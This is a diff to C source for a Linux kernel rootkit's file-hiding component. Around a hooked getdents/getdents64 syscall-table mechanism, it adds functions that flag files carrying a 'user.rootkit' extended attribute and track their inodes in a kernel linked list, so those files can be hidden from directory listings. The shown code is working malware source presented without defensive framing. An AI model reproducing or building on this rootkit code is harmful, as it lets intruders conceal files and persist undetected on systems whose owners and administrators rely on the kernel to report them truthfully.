@@ -1,12 +1,12 @@
+#include <linux/xattr.h>
+#include <linux/fs.h>
+#include <linux/fdtable.h>
+
+#include "common.h"
 #include "filehide.h"
 #include "hook.h"
 
-struct linux_dirent {
-    unsigned long  d_ino;
-    unsigned long  d_off;
-    unsigned short d_reclen;
-    char           d_name[];
-};
+#define SIZE 512
 
 void
 hide_files(void)
@@ -24,4 +24,48 @@ unhide_files(void)
     sys_calls[__NR_getdents] = (void *)sys_getdents;
     sys_calls[__NR_getdents64] = (void *)sys_getdents64;
     enable_protection();
+}
+
+
+unsigned long
+must_hide_inode(struct dentry *dentry)
+{
+    char buf[SIZE];
+
+    if(dentry && dentry->d_inode)
+        if(!inode_permission(dentry->d_inode, MAY_READ)) {
+            ssize_t len = vfs_getxattr(dentry, "user.rootkit", buf, SIZE);
+
+            if (len > 0 && !strncmp("rootkit", buf, len))
+                return dentry->d_inode->i_ino;
+        }
+
+    return 0;
+}
+
+bool
+list_contains_inode(inode_list_t_ptr node, unsigned long inode)
+{
+    inode_list_t_ptr i;
+    for (i = node; i; i = i->next)
+        if (i->inode == inode)
+            return true;
+
+    return false;
+}
+
+inode_list_t_ptr
+add_inode_to_list(inode_list_t_ptr tail, unsigned long inode)
+{
+    inode_list_t_ptr node;
+    node = (inode_list_t_ptr)kzalloc(sizeof(inode_list_t), GFP_KERNEL);
+
+    if (node) {
+        node->inode = inode;
+        node->next = NULL;
+        tail->next = node;
+        return node;
+    }
+
+    return NULL;
 }
